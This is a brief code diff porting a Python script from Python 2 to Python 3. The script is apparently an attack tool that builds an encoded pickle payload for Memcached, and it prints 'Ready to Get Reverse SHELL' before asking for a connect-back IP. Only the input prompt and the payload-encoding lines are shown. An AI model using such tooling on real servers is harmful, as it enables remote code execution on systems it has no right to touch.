@@ -1,11 +1,11 @@
 import pickle
 import os
-import urllib
+from urllib import parse
 
 
 def PyMemcached():
     print("\033[01m" + "\nReady to Get Reverse SHELL\n" + "\033[0m")
-    server = raw_input(
+    server = input(
         "\033[96m"
         + "Give server IP you want to connect (default is 127.0.0.1): "
         + "\033[0m"
@@ -30,7 +30,7 @@ def PyMemcached():
 
     def get_payload(command):
         payload = (
-            urllib.quote_plus(command)
+            parse.quote_plus(command)
             .replace("+", "%20")
             .replace("%2F", "/")
             .replace("%25", "%")
